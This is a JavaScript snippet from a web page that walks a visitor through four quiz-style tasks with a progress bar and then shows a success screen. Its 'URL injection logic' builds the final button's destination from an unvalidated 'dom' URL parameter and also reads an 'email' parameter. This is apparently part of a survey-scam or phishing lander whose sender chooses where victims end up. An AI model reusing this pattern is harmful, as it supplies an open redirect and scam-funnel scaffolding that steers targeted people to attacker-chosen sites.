
  let currentTask = 1;
  const totalTasks = 4;
  let selectedOptions = { task1: null, task2: null, task3: null, task4: null };

  function startTasks() {
    document.getElementById('welcomePopup').style.display = 'none';
    document.getElementById('taskContainer').style.display = 'block';
    document.querySelectorAll('.task').forEach(task => task.classList.remove('active'));
    document.getElementById('task1').classList.add('active');
    currentTask = 1;
    updateProgress();
  }

  function selectOption(optionElement, taskName) {
    const options = optionElement.parentElement.querySelectorAll('.option');
    options.forEach(opt => {
      opt.classList.remove('selected');
      opt.querySelector('input').checked = false;
    });
    optionElement.classList.add('selected');
    optionElement.querySelector('input').checked = true;
    selectedOptions[taskName] = optionElement.querySelector('input').id;

    setTimeout(() => {
      const currentTaskNumber = parseInt(taskName.replace('task', ''));
      if (currentTaskNumber < totalTasks) {
        document.getElementById('task' + currentTaskNumber).classList.remove('active');
        document.getElementById('task' + (currentTaskNumber + 1)).classList.add('active');
        currentTask = currentTaskNumber + 1;
      } else {
       document.querySelectorAll('.task').forEach(task => task.style.display = 'none');
document.getElementById('success').style.display = 'block';

        currentTask = totalTasks + 1;
      }

      updateProgress();
    }, 800);
  }

  function updateProgress() {
    const progressBar = document.getElementById('progressBar');
    const progressText = document.getElementById('progressText');

    let completed = currentTask - 1;
    if (completed >= totalTasks) completed = totalTasks;

    const progressPercentage = (completed / totalTasks) * 100;
    progressBar.style.width = progressPercentage + '%';
    progressText.textContent = `${completed}/${totalTasks} Tasks`;
  }

  // URL injection logic
  function getURLParameter(name) {
    return decodeURI(
      (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
    );
  }

  const dom = getURLParameter('dom');
  const email = getURLParameter('email');
  const realemail = email.replace('%40', '@');
  const link = "https://" + dom + "/click/1";

  document.addEventListener('DOMContentLoaded', () => {
    const finalBtn = document.querySelector('.go-final');
    if (finalBtn) finalBtn.setAttribute('href', link);
  });
